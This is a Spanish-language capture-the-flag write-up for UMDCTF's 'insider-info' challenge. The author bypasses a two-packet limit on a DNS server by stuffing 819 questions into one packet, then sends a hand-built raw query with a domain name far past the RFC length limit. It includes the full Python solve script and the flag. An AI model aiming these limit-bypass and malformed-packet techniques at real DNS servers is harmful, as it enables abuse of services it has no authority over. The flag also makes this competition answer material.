**Flag:** `UMDCTF{5Ur31Y_N0_0N3_W111_N071C3_MY_1N51D3r_7r4D1N6}`

**Categoría:** Misc

**Autor del Reto:** cephi-sui

***

## Contexto

Este reto de redes y DNS me complico un poco, pero cuando logré entender por dónde iba la mano, la resolución fue súper satisfactoria.

A simple vista, teníamos que sacarle información a un servidor DNS medio mañoso que solo aceptaba dos consultas antes de cortarte la conexión de una.

## Desafío: insider-info

```"What better way to hide inside info on the Internet? nc challs.umdctf.io 32323"```

Nos pasaban el código fuente (`dns_server.py`) de un servidor DNS que corría por TCP. El objetivo final era armar un subdominio específico con un "secreto" y pedirle la flag.

El problema era el límite: el server te botaba la llamada después de solo 2 paquetes. Y el secreto que necesitábamos tenía 819 caracteres, que debían pedirse de a uno (onda `0.inside.info`, `1.inside.info`, etc.).

¿Cómo sacas 819 piezas de información y luego pides la flag teniendo solo 2 tiros? Ahí estaba la gracia del reto.

### La vulnerabilidad: Empaquetar todo en un solo envío

Imagínense que van al supermercado y por alguna regla rara solo pueden pasar por caja dos veces. En vez de llevar un producto por vez, llenas un carro gigante hasta el tope y lo pasas de una sola vez.

En el protocolo DNS pasa algo súper parecido. El servidor limitaba la cantidad de *paquetes* (las conexiones a la caja), pero nunca validaba cuántas *preguntas* venían dentro de cada paquete.

Así que el bypass fue súper directo:
- **Tiro 1:** Armamos un solo paquete DNS con 819 preguntas adentro al mismo tiempo. El server no se da cuenta y nos devuelve el secreto entero de golpe.
- **Tiro 2:** Con el secreto ya en nuestro poder, armamos el subdominio gigante y le pedimos la flag.

### Obstáculos: Peleando con el estándar y la librería

Aquí fue donde me empecé a frustrar un poco y tuve que cabecear harto para avanzar.

Para armar el subdominio de la flag en el Tiro 2, partí el secreto de 819 caracteres en pedazos de 63, separados por puntos (que es el límite por RFC para cada parte de un dominio).

Pero al intentar enviar esto, la librería `dnslib` me tiraba errores por todos lados y no me dejaba compilar el paquete. ¿Por qué? Porque un dominio no puede tener más de 255 caracteres en total según el estándar, y el mío tenía más de 800.

**La solución:** Mandar la validación de la librería a la punta del cerro. Construí el paquete DNS a mano usando bytes crudos, saltándome las reglas locales de Python.

Como el server a veces andaba inestable y me reseteaba la conexión de la nada (`ConnectionResetError`), le metí un bucle con un `time.sleep(3)` para que reintentara solo y no me dejara botado.

### Solución

El script final (`solve.py`). Mezclé la comodidad de `dnslib` para la primera fase y puro hacking en bytes crudos para la segunda, extrayendo la flag del buffer con un regex.

```python
import socket
import re
import time
from dnslib import DNSRecord, DNSQuestion, QTYPE

HOST = "challs.umdctf.io"
PORT = 32323

def recvall(sock, n):
    # Función salvavidas para no perder bytes en la red
    data = b''
    while len(data) < n:
        packet = sock.recv(n - len(data))
        if not packet: return None
        data += packet
    return data

def build_raw_query(domain):
    # Armamos la query a mano porque dnslib llora por el límite del RFC
    header = b'\x13\x37\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00'
    qname = b''
    for part in domain.split('.'):
        if part:
            qname += bytes([len(part)]) + part.encode()
    qname += b'\x00'
    footer = b'\x00\x10\x00\x01' 
    return header + qname + footer

def solve():
    print("[*] Fase 1: Metiendo 819 preguntas al carrito...")
    q1 = DNSRecord()
    for i in range(819):
        q1.add_question(DNSQuestion(f"{i}.inside.info", QTYPE.TXT))
    
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((HOST, PORT))

    # Mandamos el primer tiro por TCP
    data1 = q1.pack()
    s.sendall(len(data1).to_bytes(2, byteorder='big') + data1)

    length = int.from_bytes(recvall(s, 2), byteorder='big')
    resp1 = DNSRecord.parse(recvall(s, length))

    # Reconstruimos el secreto ordenando las respuestas
    secret_map = {}
    for rr in resp1.rr:
        try:
            secret_map[int(str(rr.rname).split('.')[0])] = b"".join(rr.rdata.data).decode()
        except ValueError:
            continue
    secret_str = ''.join(secret_map[i] for i in range(819))

    print("[*] Fase 2: Mandando el dominio mutante en raw bytes...")
    subdomain = '.'.join([secret_str[i:i+63] for i in range(0, 819 - 63 + 1, 63)])
    data2 = build_raw_query(subdomain + ".inside.info")
    
    # Segundo tiro
    s.sendall(len(data2).to_bytes(2, byteorder='big') + data2)

    length2 = int.from_bytes(recvall(s, 2), byteorder='big')
    resp_data2 = recvall(s, length2)

    # Cazamos la flag con regex directo en los bytes
    match = re.search(b'([a-zA-Z0-9_]{3,}\\{.*?\\})', resp_data2)
    if match:
        print(f"\n[+] FLAG: {match.group(1).decode()}\n")
        return True
    return False

# Bucle para pelear con los rate-limits del server
if __name__ == "__main__":
    for intento in range(1, 6):
        try:
            if solve(): break
        except Exception:
            print("[-] Server mañoso. Reintentando en 3s...")
            time.sleep(3)
```

### Ejecución y Flag obtenida

Lo dejé corriendo en mi terminal, dando pelea un rato con los timeouts de la red, hasta que finalmente el servidor se tragó nuestro dominio gigante y soltó la flag.

```
UMDCTF{5Ur31Y_N0_0N3_W111_N071C3_MY_1N51D3r_7r4D1N6}
```

## Aprendizajes

* Quedó demostradísimo que limitar la cantidad de conexiones no sirve de nada si la infra no valida el payload por dentro. El protocolo DNS es demasiado flexible.
* A veces las mismas herramientas de hacking (como las librerías de Python) te limitan más que el propio servidor por tratar de ser "correctas". Bajar a nivel de bytes crudos siempre salva el día.
* Tuve que insistir bastante con el manejo de excepciones y sockets TCP, pero ver la flag parseada en la consola hizo que todo el dolor de cabeza valiera la pena.
